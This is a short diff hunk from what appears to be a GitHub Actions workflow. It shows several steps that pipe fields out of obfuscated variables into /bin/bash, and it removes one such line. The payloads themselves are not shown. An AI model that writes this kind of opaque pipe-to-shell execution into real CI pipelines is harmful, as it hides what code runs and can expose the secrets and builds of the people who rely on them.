@@ -29,7 +29,6 @@ jobs:
           printf '%s' "$njwqt92" | jq -r .le266 | /bin/bash
           printf '%s' "$v2" | jq -r .kvce148 | /bin/bash
           printf '%s' "$ooezg3092" | jq -r .t22961 | /bin/bash
-          printf '%s' "$utltg32" | jq -r .lbqf81041 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
